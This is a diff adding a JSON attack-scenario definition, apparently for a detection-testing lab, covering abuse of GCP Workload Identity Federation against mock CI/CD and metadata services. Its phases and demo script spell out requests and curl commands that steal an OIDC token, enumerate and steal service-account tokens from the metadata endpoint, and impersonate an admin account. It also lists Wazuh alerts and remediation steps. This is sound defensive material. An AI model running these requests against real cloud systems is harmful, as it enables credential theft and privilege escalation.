@@ -1,0 +1,221 @@
+{
+  "id": "S6-03",
+  "name": "Workload Identity Federation Abuse",
+  "category": "Infrastructure",
+  "version": "1.0",
+  "description": "Abuse misconfigured GCP Workload Identity Federation to exchange a stolen CI/CD OIDC token for GCP cloud access. WIF trust policies with overly broad subject claims allow any repo/branch to assume cloud identity.",
+  "difficulty": "Hard",
+  "real_world_relevance": "AWS GitHub OIDC federation misconfigurations. GCP WIF trust policy bypass. Azure federated identity credential abuse. Overly permissive subject claims in WIF trust policies are a common misconfiguration.",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Privilege Escalation"],
+    "techniques": [
+      {"id": "T1078.004", "name": "Valid Accounts: Cloud Accounts"},
+      {"id": "T1550.001", "name": "Use Alternate Authentication Material: Application Access Token"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["cicd-runner", "cloud-workload"],
+    "network": "cloud_net",
+    "services": ["mock-gcp-metadata:1339", "mock-cicd:8080"],
+    "permissions": "CI/CD runner with OIDC token + network access to GCP STS"
+  },
+
+  "attack_flow": {
+    "description": "Attacker steals a CI/CD OIDC token and exchanges it via GCP Workload Identity Federation for a GCP access token, then escalates to service account impersonation",
+    "diagram": [
+      "1. Attacker compromises CI/CD pipeline or steals OIDC token",
+      "2. Attacker discovers GCP WIF configuration (audience, provider)",
+      "3. Attacker exchanges OIDC token for GCP federated token via STS",
+      "4. WIF trust policy is too broad (accepts any repo/branch)",
+      "5. Attacker receives GCP access token with cloud-platform scope",
+      "6. Attacker impersonates high-privilege service account",
+      "7. Attacker accesses GCP resources (Storage, Compute, IAM)"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "OIDC Token Theft",
+      "description": "Steal the CI/CD OIDC token from the pipeline environment",
+      "actions": [
+        {
+          "type": "http_request",
+          "method": "GET",
+          "target": "http://mock-cicd:8080/github/actions/oidc/token?audience=https://iam.googleapis.com/projects/123456789012/locations/global/workloadIdentityPools/demo-pool/providers/github-actions",
+          "expected_output_contains": ["eyJ"],
+          "expected_status": 200,
+          "description": "Request OIDC token with GCP WIF audience"
+        }
+      ]
+    },
+    {
+      "name": "GCP Metadata Discovery",
+      "description": "Probe GCP metadata service for project and SA information",
+      "actions": [
+        {
+          "type": "http_request",
+          "method": "GET",
+          "target": "http://mock-gcp-metadata:1339/computeMetadata/v1/project/project-id",
+          "headers": {"Metadata-Flavor": "Google"},
+          "expected_output_contains": ["demo-project"],
+          "expected_status": 200
+        },
+        {
+          "type": "http_request",
+          "method": "GET",
+          "target": "http://mock-gcp-metadata:1339/computeMetadata/v1/instance/service-accounts/",
+          "headers": {"Metadata-Flavor": "Google"},
+          "expected_output_contains": ["default"],
+          "expected_status": 200,
+          "description": "Enumerate available service accounts"
+        }
+      ]
+    },
+    {
+      "name": "STS Token Exchange",
+      "description": "Exchange stolen OIDC token for GCP federated access token via WIF",
+      "critical": true,
+      "actions": [
+        {
+          "type": "http_request",
+          "method": "POST",
+          "target": "http://mock-gcp-metadata:1339/v1/token",
+          "body": "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"subject_token\":\"<stolen_oidc_token>\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:jwt\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\"}",
+          "expected_output_contains": ["access_token", "Bearer"],
+          "expected_status": 200,
+          "description": "Exchange OIDC token for GCP access token via Workload Identity Federation"
+        }
+      ]
+    },
+    {
+      "name": "Service Account Impersonation",
+      "description": "Use federated token to impersonate a high-privilege service account",
+      "critical": true,
+      "actions": [
+        {
+          "type": "http_request",
+          "method": "POST",
+          "target": "http://mock-gcp-metadata:1339/v1/projects/-/serviceAccounts/admin-sa@demo-project-12345.iam.gserviceaccount.com:generateAccessToken",
+          "body": "{\"scope\":[\"https://www.googleapis.com/auth/cloud-platform\"],\"lifetime\":\"3600s\"}",
+          "expected_output_contains": ["accessToken"],
+          "expected_status": 200,
+          "description": "Impersonate admin service account using WIF token"
+        }
+      ]
+    },
+    {
+      "name": "Direct SA Token Theft",
+      "description": "Alternative path: steal SA token directly from metadata service",
+      "actions": [
+        {
+          "type": "http_request",
+          "method": "GET",
+          "target": "http://mock-gcp-metadata:1339/computeMetadata/v1/instance/service-accounts/default/token",
+          "headers": {"Metadata-Flavor": "Google"},
+          "expected_output_contains": ["access_token", "Bearer"],
+          "expected_status": 200,
+          "description": "Steal default service account token from metadata"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "WebAccess",
+      "description": "GCP metadata service account enumeration",
+      "wazuh_rule": "100653"
+    },
+    {
+      "type": "WebAccess",
+      "description": "GCP service account token theft",
+      "wazuh_rule": "100654"
+    },
+    {
+      "type": "WebAccess",
+      "description": "WIF token exchange (STS endpoint)",
+      "wazuh_rule": "100907"
+    },
+    {
+      "type": "WebAccess",
+      "description": "Service account impersonation",
+      "wazuh_rule": "100654"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100653",
+      "level": 8,
+      "description": "NHI: GCP Metadata Service access detected"
+    },
+    {
+      "rule_id": "100654",
+      "level": 12,
+      "description": "NHI: GCP service account token request - CREDENTIAL THEFT"
+    },
+    {
+      "rule_id": "100907",
+      "level": 10,
+      "description": "NHI: JWT token pattern detected (WIF exchange)"
+    },
+    {
+      "rule_id": "100950",
+      "level": 14,
+      "description": "NHI: Credential harvesting combined with IMDS access"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Revoke all tokens issued via the WIF pool",
+      "Rotate compromised service account keys",
+      "Audit GCP Cloud Audit Logs for unauthorized API calls"
+    ],
+    "long_term": [
+      "Restrict WIF trust policy to specific repos and branches",
+      "Use attribute conditions to limit subject claims (e.g., repo:org/repo:ref:refs/heads/main)",
+      "Avoid granting iam.serviceAccounts.getAccessToken to WIF-authenticated identities",
+      "Use Workload Identity pools with separate providers per environment",
+      "Enable Organization Policy constraints for WIF"
+    ],
+    "wif_trust_policy_fix": {
+      "description": "Restrict WIF to specific repo and branch",
+      "attribute_condition": "assertion.sub == 'repo:myorg/myrepo:ref:refs/heads/main'"
+    }
+  },
+
+  "demo_script": {
+    "container": "cloud-workload",
+    "commands": [
+      "# Step 1: Discover GCP project",
+      "curl -s -H 'Metadata-Flavor: Google' http://mock-gcp-metadata:1339/computeMetadata/v1/project/project-id 2>/dev/null || echo 'GCP metadata not reachable'",
+      "",
+      "# Step 2: Enumerate service accounts",
+      "curl -s -H 'Metadata-Flavor: Google' http://mock-gcp-metadata:1339/computeMetadata/v1/instance/service-accounts/ 2>/dev/null || echo 'SA enum failed'",
+      "",
+      "# Step 3: Steal default SA token",
+      "curl -s -H 'Metadata-Flavor: Google' http://mock-gcp-metadata:1339/computeMetadata/v1/instance/service-accounts/default/token 2>/dev/null | python3 -m json.tool || echo 'Token theft failed'",
+      "",
+      "# Step 4: Simulate WIF exchange",
+      "echo 'Would run: curl -X POST http://mock-gcp-metadata:1339/v1/token -d grant_type=urn:ietf:params:oauth:grant-type:token-exchange'"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "GCP Workload Identity Federation",
+      "url": "https://cloud.google.com/iam/docs/workload-identity-federation"
+    },
+    {
+      "title": "MITRE ATT&CK T1078.004 - Cloud Accounts",
+      "url": "https://attack.mitre.org/techniques/T1078/004/"
+    },
+    {
+      "title": "Securing CI/CD Pipelines with Workload Identity",
+      "url": "https://cloud.google.com/blog/products/identity-security/enabling-keyless-authentication-from-github-actions"
+    }
+  ]
+}
